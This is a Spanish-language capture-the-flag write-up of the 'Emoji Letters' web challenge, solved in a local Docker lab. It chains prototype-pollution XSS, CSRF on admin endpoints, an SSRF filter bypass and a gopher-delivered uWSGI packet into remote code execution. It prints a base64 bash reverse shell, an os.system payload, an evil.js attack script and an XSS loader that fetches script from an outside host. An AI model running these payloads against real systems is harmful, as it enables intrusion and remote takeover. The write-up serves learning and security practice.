---
layout: post
title:  "RoomHack CTF 2022 - 💌 Emoji Letters"
date:   2022-09-29 00:43:53 -0300
---

# Init

Emoji Letters fue un challenge web del CTF RoomHack 2022. No logre resolverlo a tiempo, pero pude descargarme el challenge con todo lo necesario para reventar el reto en `localhost`.

{% highlight text %}
$ q3rv0@raven ~/ctf/htb/web_emoji_letters$ tree .                                                                       
.
├── build-docker.sh
├── challenge
│   ├── application
│   │   ├── blueprints
│   │   │   └── routes.py
│   │   ├── bot.py
│   │   ├── config.py
│   │   ├── database.py
│   │   ├── main.py
│   │   ├── static
│   │   │   ├── css
│   │   │   │   ├── admin.css
│   │   │   │   ├── bootstrap.min.css
│   │   │   │   ├── emoji.css
│   │   │   │   ├── index.css
│   │   │   │   ├── letter.css
│   │   │   │   └── loader.css
│   │   │   ├── emoji.json
│   │   │   └── js
│   │   │       ├── admin.js
│   │   │       ├── bootstrap.bundle.min.js
│   │   │       ├── emoji.js
│   │   │       ├── index.js
│   │   │       ├── jquery-3.6.0.min.js
│   │   │       ├── jquery.parseparams.js
│   │   │       ├── letter.js
│   │   │       ├── loader.js
│   │   │       ├── login.js
│   │   │       └── xss.js
│   │   ├── templates
│   │   │   ├── admin.html
│   │   │   ├── index.html
│   │   │   ├── letter.html
│   │   │   └── login.html
│   │   └── util.py
│   ├── flask_session
│   ├── requirements.txt
│   ├── uwsgi.ini
│   └── wsgi.py
├── config
│   ├── nginx.conf
│   ├── readflag.c
│   └── supervisord.conf
├── Dockerfile
├── flag.txt

{% endhighlight %}

Arranquemos levantando el docker.

`$ q3rv0@raven ~/ctf/htb/web_emoji_letters$ sudo ./build-docker.sh`

Y ya tenemos una linda app corriendo en el puerto `1337`.

![image 1](/ctf/assets/images/emoji-letters-1.png)

Entonces... escribamos una carta a algún amigo.

![image 1](/ctf/assets/images/emoji-letters-2.png)

`report as inappropriate`, mmm... claramente si me mandaran una carta así la reportaría como inapropiada. Miremos un poquito el código en:

`./challenge/application/blueprints/routes.py`.

{% highlight python %}

[REDACTED]

@api.route('/report', methods=['POST'])
def report_issue():
    if not request.is_json:
        return response('Missing required parameters!', 401)

    data = request.get_json()
    uid = data.get('uid', '')

    if not uid:
        return response('Missing required parameters!', 401)

    visit_letter(uid)

    return response('Letter reported successfully!')

[REDACTED]    

{% endhighlight %}

Si la reportamos, parece ser que enviá el UUID de la carta como argumento a la función `visit_letter()`.

Esta función se encuentra definida en `./challenge/application/bot.py`.

{% highlight python %}

from selenium import webdriver
from selenium.webdriver.common.by import By
from flask import current_app
import time

def visit_letter(uid):
    chrome_options = webdriver.ChromeOptions()

    chrome_options.add_argument('--headless')
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-background-networking')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--disable-sync')
    chrome_options.add_argument('--disable-translate')
    chrome_options.add_argument('--metrics-recording-only')
    chrome_options.add_argument('--mute-audio')
    chrome_options.add_argument('--no-first-run')
    chrome_options.add_argument('--safebrowsing-disable-auto-update')
    chrome_options.add_argument('--js-flags=--noexpose_wasm,--jitless')

    client = webdriver.Chrome(chrome_options=chrome_options)
    client.set_page_load_timeout(5)
    client.set_script_timeout(5)

    client.get('http://localhost/login')

    username = client.find_element(By.ID, 'username')
    password = client.find_element(By.ID, 'password')
    login = client.find_element(By.ID, 'login-btn')

    username.send_keys(current_app.config['ADMIN_USERNAME'])
    password.send_keys(current_app.config['ADMIN_PASSWORD'])
    login.click()
    time.sleep(3)
    try:
        client.get('http://localhost/letter?uid=' + uid)
        time.sleep(3)
    except:
        pass
    client.quit()

{% endhighlight %}

Uh listo, el falso admin que se loguea en la aplicación y mira la cartita.

{% highlight python %}
client.get('http://localhost/letter?uid=' + uid)
{% endhighlight %}

Esto me suena a Client-Side Attack de acá a la China Suárez.

Vamos a ver si se come un XSS la app.

_HTTP Request_:
{% highlight text %}
POST /api/create HTTP/1.1
Host: emoji.htb:1337
Content-Length: 134
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://emoji.htb:1337
Referer: http://emoji.htb:1337/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-AR;q=0.8,es;q=0.7
Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54
Connection: close

{"userLetter":"<img src='foo' onerror='alert(/💛/)'>", "userEmoji":"<img src='bar' onerror='alert(/💛/)'>"}
{% endhighlight %}

_HTTP Response_:
{% highlight text %}
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 29 Sep 2022 08:15:19 GMT
Content-Type: application/json
Content-Length: 87
Connection: close
Set-Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54; Expires=Sun, 30 Oct 2022 08:15:19 GMT; HttpOnly; Path=/

{"message":"Letter created successfully","uid":"b779c5bf-b3c6-432c-95e4-89362e1d3bda"}
{% endhighlight %}

Ya tenemos el UUID `b779c5bf-b3c6-432c-95e4-89362e1d3bda` de la carta, a verga...

![image3](/ctf/assets/images/emoji-letters-3.png)

Bueno... no salto el XSS, que esta pasando acá?. Por que en el back no veo ningún tipo de filtro, debería saltar el alert 💛, a ver en el front.

`./challenge/application/static/js/letter.js`

{% highlight javascript %}

const loadLetter = async (uid) => {

    await fetch('/api/letter', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            uid
        }),
    })
    .then((response) => response.json()
        .then((resp) => {
            if (response.status != 200) {
                location.href = '/';
            }
            $('.emoji-pattern').html(filterXSS(resp.emoji));
            $('#letterContent').text(filterXSS(resp.letter));
        }))
    .catch((error) => {
        console.error(error);
    });

}

{% endhighlight %}

Mira los hijos de puta, cuando se traen el valor de la key `emoji` le clavan un `filterXSS()`.

{% highlight javascript %}

$('.emoji-pattern').html(filterXSS(resp.emoji));

{% endhighlight %}

Hasta acá se dos cosas:

* El parámetro vulnerable a XSS es `userEmoji` por que lo imprime como HTML, en cambio `userLetter` se imprime como text.
* `filterXSS()` es una función de la librería  [js-xss](https://github.com/leizongmin/js-xss).

Me puse a buscar algún bypass publico pero no encontré un carajo. Hasta que me acorde que tenia que probar algo que últimamente en varios CTFs siempre esta presente.

# Client-Side Prototype Pollution

Están abusando de esta técnica a loco, son como los chilenos con la palta, le meten palta a todo.

Y mirando las primeras lineas del script `./challenge/application/static/js/letter.js` esta mas que claro que se la come doblada.

{% highlight javascript %}

window.onload = () => {
    params = $.parseParams(location.search);
    if (!params.hasOwnProperty('uid')) location.href = '/';
    loadLetter(params.uid);
    $('#reportLetter').on('click', () => { reportLetter(params.uid) });
}

{% endhighlight %}

`/letter?uid=b779c5bf-b3c6-432c-95e4-89362e1d3bda&__proto__.Guido=Kaczka`

![image3](/ctf/assets/images/emoji-letters-4.png)

Listorti. Y ahora que objeto envenenamos?.

Mirando la docu de [js-xss](https://github.com/leizongmin/js-xss), veo esto.

![image3](/ctf/assets/images/emoji-letters-5.png)

`whiteList` es un objeto que contiene todos los tags HTML con sus correspondientes atributos permitidos. Miremos un poquito img.

`filterXSS.whiteList.img`

![image3](/ctf/assets/images/emoji-letters-6.png)

Listo papu, cuestión de envenenar el objeto `whiteList` y decirle: En el tag `img` no me filtras `onerror` capo.

y salio el alert nomas guachoooww!!.

`/letter?uid=b779c5bf-b3c6-432c-95e4-89362e1d3bda&__proto__.whiteList.img[0]=onerror&__proto__.whiteList.img[1]=src`

![image3](/ctf/assets/images/emoji-letters-7.png)

Todo bien, pero si lo mando a esta URL al admin va a ver el 💛 y va a flashar amor.

# Siendo admin por primera vez

Claramente no le puedo chorear la cookie por que tiene seteado el flag `HttpOnly`.

`Set-Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54; Expires=Sun, 30 Oct 2022 09:58:34 GMT; HttpOnly; Path=/`

Pero si puedo clavar un CSRF sobre alguna funcionalidad que este usando.

Volvamos a `./challenge/application/blueprints/routes.py`.

{% highlight python %}

[REDACTED]

@api.route('/admin/emoji-pack/update', methods=['POST'])
@login_required
def emojiUpdate():
    if not request.is_json:
        return response('Missing required parameters!', 401)

    data = request.get_json()
    emojiData = data.get('emojiData', '')

    if not emojiData:
        return response('Missing required parameters!', 401)

    with open(current_app.config['EMOJI_PACK_PATH'], 'w') as epack:
        epack.write(emojiData)

    return response('Emoji pack updated successfully!')

@api.route('/admin/emoji-pack/import', methods=['POST'])
@login_required
def emojiImport():
    if not request.is_json:
        return response('Missing required parameters!', 401)

    data = request.get_json()
    emojiURL = data.get('emojiURL', '')

    if not emojiURL:
        return response('Missing required parameters!', 401)

    result = retireve_json(emojiURL)

    if (type(result)) is not dict:
        return response(result, 401)

    with open(current_app.config['EMOJI_PACK_PATH'], 'w') as epack:
        epack.write(result)

    return response('Emoji pack updated successfully!')

[REDACTED]    

{% endhighlight %}

Por un lado tenemos la ruta `/admin/emoji-pack/update` que toma el valor del parámetro `emojiData` y sobrescribe el fichero local `/app/application/static/emoji.json`.

Por otra parte esta la ruta `/admin/emoji-pack/import`, que hace exactamente lo mismo, pero termina descargando el contenido de una URL.

{% highlight python %}
result = retireve_json(emojiURL)
{% endhighlight %}

`./challenge/application/util.py`

{% highlight python %}
import os, pycurl, json
from urllib.parse import urlparse

generate = lambda x: os.urandom(x).hex()

def request(url):
    try:
        c = pycurl.Curl()
        c.setopt(c.URL, url)
        c.setopt(c.TIMEOUT, 10)
        c.setopt(c.VERBOSE, True)   
        c.setopt(c.FOLLOWLOCATION, True)
        c.setopt(c.HTTPHEADER, [
            'Accept: application/json',
            'Content-Type: application/json'
        ])

        resp = c.perform_rb().decode('utf-8', errors='ignore')
        c.close()

        return resp

    except pycurl.error as e:
        return 'Something went wrong!'

def retireve_json(url):
    domain = urlparse(url).hostname
    scheme = urlparse(url).scheme

    if not filter(lambda x: scheme in x, ('http',' https')):
        return f'Scheme {scheme} is not allowed'

    elif domain and not domain == 'githubusercontent.com':
        return f'Domain {domain} is not allowed'

    try:
        jsonData = json.loads(request(url))
        return jsonData
    except:
        return 'Not a valid JSON file'


{% endhighlight %}

Por lo que veo están usando `pycurl` para generar un request, y la función `retireve_json()`tiene un par de filtros:

* Al parecer solo admite los schemes http/https
* El dominio tiene que ser `githubusercontent.com`.

Que carajo...

Quiero testear esto como admin, así que vamos a hacerla corta, me voy a bajar la db, saco las creds, me logueo en el panel y empiezo a probar a manuela a ver si se come un `SSRF`. Para algo nos dieron el docker.

{% highlight bash %}

q3rv0@raven ~/ctf/htb/web_emoji_letters$ sudo docker exec -it 7c2c7b9581be bash                                                                      
root@7c2c7b9581be:/app# cp /tmp/database.db /app/application/static/
root@7c2c7b9581be:/app# exit
exit
q3rv0@raven ~/ctf/htb/web_emoji_letters$ wget http://emoji.htb:1337/static/database.db                                                               
--2022-09-29 19:15:49--  http://emoji.htb:1337/static/database.db
Resolving emoji.htb (emoji.htb)... 127.0.0.1
Connecting to emoji.htb (emoji.htb)|127.0.0.1|:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16384 (16K) [text/plain]
Saving to: ‘database.db’

database.db                           100%[=======================================================================>]  16,00K  --.-KB/s    in 0s      

2022-09-29 19:15:49 (223 MB/s) - ‘database.db’ saved [16384/16384]

q3rv0@raven ~/ctf/htb/web_emoji_letters$ sqlite3 database.db                                                                                         
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
letter  user  
sqlite> select * from user;
1|admin|7d350e0936aa5eb40f12075d215073
sqlite> .quit


{% endhighlight %}

Atrodennn.

![image3](/ctf/assets/images/emoji-letters-8.png)

Veamos que onda el `SSRF`.

_HTTP Request_:
{% highlight text %}
POST /api/admin/emoji-pack/import HTTP/1.1
Host: emoji.htb:1337
Content-Length: 34
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://emoji.htb:1337
Referer: http://emoji.htb:1337/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-AR;q=0.8,es;q=0.7
Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54
Connection: close

{"emojiURL":"https://xvideos.com"}
{% endhighlight %}

_HTTP Response_:
{% highlight text %}
HTTP/1.1 401 UNAUTHORIZED
Server: nginx
Date: Fri, 30 Sep 2022 08:10:39 GMT
Content-Type: application/json
Content-Length: 48
Connection: close
Set-Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54; Expires=Mon, 31 Oct 2022 08:10:39 GMT; HttpOnly; Path=/

{"message":"Domain xvideos.com is not allowed"}
{% endhighlight %}

Si, claramente tienen un filtro anti-porno. Después de probar un rato, llegue a la conclusion de que se pasa los `if` por el orto cuando le meto `scheme:///domain`.

* La validación del scheme esta implementado para el reverendo ojete.

_HTTP Request_:
{% highlight text %}
POST /api/admin/emoji-pack/import HTTP/1.1
Host: emoji.htb:1337
Content-Length: 33
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://emoji.htb:1337
Referer: http://emoji.htb:1337/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-AR;q=0.8,es;q=0.7
Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54
Connection: close

{"emojiURL":"ftp:///xvideos.com"}
{% endhighlight %}

_HTTP Response_:
{% highlight text %}
HTTP/1.1 401 UNAUTHORIZED
Server: nginx
Date: Fri, 30 Sep 2022 08:42:53 GMT
Content-Type: application/json
Content-Length: 36
Connection: close
Set-Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54; Expires=Mon, 31 Oct 2022 08:42:53 GMT; HttpOnly; Path=/

{"message":"Not a valid JSON file"}
{% endhighlight %}

* Al clavarle `///` toma el domain como `None` y nunca entra en `elif domain and not domain == 'githubusercontent.com':`, ya que domain es `None` (creo que es eso).

{% highlight python %}
>>> from urllib.parse import urlparse
>>> url = 'https:///xvideos.com'
>>> type(urlparse(url).hostname)
<class 'NoneType'>

{% endhighlight %}

Bueno ya tenemos algo que explotar con el `XSS`, un `Blind SSRF`.

Que garcha hago con esto?.

# uWSGI Server

Me encuentro este archivito `./challenge/uwsgi.ini`.

{% highlight text %}
[uwsgi]
module = wsgi:app

uid = www-data
gid = www-data

socket = 127.0.0.1:5000
socket = /tmp/uwsgi.sock

[REDACTED]
{% endhighlight %}

Que es uWSGI?

Ademas de decirte que es una aplicación, una imagen vale mas que 2 párrafos.

![image 1](/ctf/assets/images/emoji-letters-9.png)

Esta cosita es un Gateway que se comunica con la app en Python, en este caso `Flask`.

Al toque me puse a tirar keywords en google: `SSRF uWSGI RCE SARASA` y me encontré con este lindo exploit.

[Uwsgi RCE Exploit](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)

Un saludito a [wofeiwo](https://github.com/wofeiwo) por el lindo exploit que se mando. Gracias amigo!, mandale un 😘 a tu hermana también.

Básicamente el exploit lo que hace es generar un paquetito `uWSGI` a partir del siguiente dic.

{% highlight python %}
var = {
       'SERVER_PROTOCOL': 'HTTP/1.1',
       'REQUEST_METHOD': 'GET',
       'PATH_INFO': path,
       'REQUEST_URI': uri,
       'QUERY_STRING': qs,
       'SERVER_NAME': host,
       'HTTP_HOST': host,
       'UWSGI_FILE': payload,
       'SCRIPT_NAME': target_url
   }
{% endhighlight %}

Algo que me llama la atención es esto `'UWSGI_FILE': payload`, que es donde va la magia para meter un RCE, pero el flaco le manda este valor en `payload`.

`'exec://' + args.command + "; echo test"`

`exec://` el wrapper que nunca esta en ningún server instalado. Vamos a ver para que mierda sirve la variable `UWSGI_FILE`.

A ver la docu! diría Guido.

![image 1](/ctf/assets/images/emoji-letters-10.png)

Bueno eso me gusto, si le paso un file lo carga dinamicamente. Si no mal recuerdo puedo sobrescribir el archivo `/app/application/static/emoji.json`. Si le meto código en python, genero el paquete uWSGi y se lo mando al server debería tener RCE.

Primero vamos a robar algunas funciones del [Uwsgi RCE Exploit](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py) y realizar algunas modificaciones para generar el packet.

`pack_uwsgi.py`
{% highlight python %}

var = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'REQUEST_METHOD': 'GET',
        'PATH_INFO': '/',
        'REQUEST_URI': '',
        'QUERY_STRING': '',
        'SERVER_NAME': '127.0.0.1:5000',
        'HTTP_HOST': '127.0.0.1:5000',
        'UWSGI_FILE': '/app/application/static/emoji.json',
        'SCRIPT_NAME': '/pwned'
    }

def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = s.decode('hex')
    return s[::-1]


def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items() if hasattr(var, 'items') else var:
        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
    result = b'\x00' + sz(pk) + b'\x00' + pk
    return result

print(pack_uwsgi_vars(var))

{% endhighlight %}

Ejecutamos el script y tenemos la papa.

{% highlight bash %}
q3rv0@raven /tmp$ python2.7 pack_uwsgi.py                                                                                                            
�REQUEST_METHODGET	HTTP_HOST127.0.0.1:5000	PATH_INFO/
                                                          SERVER_NAME127.0.0.1:5000SERVER_PROTOCOHTTP/1.1
                                                                                                         QUERY_STRING
                                                                                                                     SCRIPT_NAME/pwned
UWSGI_FILE"/app/application/static/emoji.json
                                             REQUEST_URI

{% endhighlight %}

Como concha le mando eso al server por medio de un SSRF?, con `gopher://` papu.

`pack_uwsgi.py`
{% highlight python %}
import urllib

var = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'REQUEST_METHOD': 'GET',
        'PATH_INFO': '/',
        'REQUEST_URI': '',
        'QUERY_STRING': '',
        'SERVER_NAME': '127.0.0.1:5000',
        'HTTP_HOST': '127.0.0.1:5000',
        'UWSGI_FILE': '/app/application/static/emoji.json',
        'SCRIPT_NAME': '/pwned'
    }

def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = s.decode('hex')
    return s[::-1]


def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items() if hasattr(var, 'items') else var:
        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
    result = b'\x00' + sz(pk) + b'\x00' + pk
    return result

gopher_payload = "gopher:///127.0.0.1:5000/_%s" % urllib.quote(pack_uwsgi_vars(var))

print(gopher_payload)

{% endhighlight %}

Output:

{% highlight text %}
gopher:///127.0.0.1:5000/_%00%DA%00%00%0E%00REQUEST_METHOD%03%00GET%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%09%00PATH_INFO%01%00/%0B%00SERVER_NAME%0E%00127.0.0.1%3A5000%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0C%00QUERY_STRING%00%00%0B%00SCRIPT_NAME%06%00/pwned%0A%00UWSGI_FILE%22%00/app/application/static/emoji.json%0B%00REQUEST_URI%00%00

{% endhighlight %}

Listo, ahora vamos a sobrescribir el archivo `/app/application/static/emoji.json` con un reverse shell.

{% highlight bash %}
q3rv0@raven ~/ctf/htb/web_emoji_letters$ echo "bash -i >& /dev/tcp/192.168.0.50/5992 0>&1"|base64                                                    
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuNTAvNTk5MiAwPiYxCg==

{% endhighlight %}


_HTTP Request_:
{% highlight  text %}

POST /api/admin/emoji-pack/update HTTP/1.1
Host: emoji.htb:1337
Content-Length: 127
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://emoji.htb:1337
Referer: http://emoji.htb:1337/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-AR;q=0.8,es;q=0.7
Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54
Connection: close

{"emojiData":"import os; os.system(\"echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuNTAvNTk5MiAwPiYxCg==|base64 -d | bash\")"}

{% endhighlight %}

_HTTP Response_:
{% highlight  text %}

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 01 Oct 2022 01:52:30 GMT
Content-Type: application/json
Content-Length: 47
Connection: close
Set-Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54; Expires=Tue, 01 Nov 2022 01:52:30 GMT; HttpOnly; Path=/

{"message":"Emoji pack updated successfully!"}

{% endhighlight %}

Llego el momento de la verdad, levantamos un `nc` en el `5992` y le mandamos mecha con el SSRF.

![image 1](/ctf/assets/images/emoji-letters-11.png)

# XSS + CSRF + SSRF + RCE = PWNED

Todo joya, pero esto hay que chainearlo en un XSS y me quedo así, `sorry for my JavaScript language`.

`evil.js`

{% highlight  javascript %}

//evil.js

function post(url, data = {}){
  fetch(url, {
    'method': 'POST',
    'credentials' : 'include',
    'headers': {
      'Content-Type' : 'application/json'
    },
    'body' : JSON.stringify(data)
  });
}

function poison_emoji(){
  reverse_shell = 'import os; os.system("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuNTAvNTk5MiAwPiYxCg==|base64 -d | bash")';
  post('/api/admin/emoji-pack/update', { emojiData : reverse_shell });
}

function uWSGI_SSRF(){
  gopher_payload = 'gopher:///127.0.0.1:5000/_%00%DA%00%00%0E%00REQUEST_METHOD%03%00GET%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%09%00PATH_INFO%01%00/%0B%00SERVER_NAME%0E%00127.0.0.1%3A5000%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0C%00QUERY_STRING%00%00%0B%00SCRIPT_NAME%06%00/pwned%0A%00UWSGI_FILE%22%00/app/application/static/emoji.json%0B%00REQUEST_URI%00%00';
  post('/api/admin/emoji-pack/import', { emojiURL : gopher_payload });
}

function client_Side_Attack(){
  poison_emoji();
  uWSGI_SSRF();
}

client_Side_Attack();

{% endhighlight %}


Ahora creamos una carta con el XSS que incluya nuestro `evil.js`, algo así.

{% highlight html %}
<img src="foo" onerror="evil_js = document.createElement('script'); evil_js.src = 'http://192.168.0.50:8082/evil.js'; document.body.appendChild(evil_js);">

{% endhighlight %}

_HTTP Request_:
{% highlight text %}
POST /api/create HTTP/1.1
Host: emoji.htb:1337
Content-Length: 204
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://emoji.htb:1337
Referer: http://emoji.htb:1337/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-AR;q=0.8,es;q=0.7
Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54
Connection: close

{"userLetter":"Hi admin!",
"userEmoji":"<img src=\"foo\" onerror=\"evil_js = document.createElement('script'); evil_js.src = 'http://192.168.0.50:8082/evil.js'; document.body.appendChild(evil_js);\">"
}

{% endhighlight %}

_HTTP Response_:
{% highlight text %}
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 01 Oct 2022 07:21:06 GMT
Content-Type: application/json
Content-Length: 87
Connection: close
Set-Cookie: session=6e58f080-ab17-4291-b29b-cb3e4d3f2f54; Expires=Tue, 01 Nov 2022 07:21:06 GMT; HttpOnly; Path=/

{"message":"Letter created successfully","uid":"aafc9550-969a-4fb3-88a7-157c15041b76"}

{% endhighlight %}

Y se la reportamos al admin :).

![image 1](/ctf/assets/images/emoji-letters-12.png)

Se hizo re largo esto, nos vimos.
